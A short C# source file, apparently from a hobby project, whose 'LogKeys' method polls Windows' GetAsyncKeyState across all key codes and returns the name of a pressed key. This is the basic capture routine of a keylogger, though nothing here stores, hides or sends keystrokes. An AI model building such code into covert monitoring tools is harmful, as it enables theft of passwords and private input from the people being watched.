using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Input;
using System.Diagnostics;
using System.Windows.Forms;

namespace ConsoleApp1
{
	public class KeyPress
	{
		 //OLD CODE THINK ABOUT DELETE


		[DllImport("user32.dll")]
		public static extern int GetAsyncKeyState(int i);
		static public int sendAssNum = 1;    //not suure if I need this.

		//public static KeyPress()
		//{
			
		//}
		public string LogKeys()
		{	
			//KeyConverter object will help us read in English 
			//what a number means.
			KeysConverter convertKey = new KeysConverter();
			
			string text = "";

			
			for (int i = 0; i < 255; i++)
			{
				//GetAsuncKeyState returns the int form of the hexidecimal number
				//that windows hooks too. These are "Virtual-Key Codes"
				int key = GetAsyncKeyState(i);
				if(key ==1 || key == -32767)
				{
					text = convertKey.ConvertToString(i);
					return text;
				}

			}

			return "";
		}

	}
}
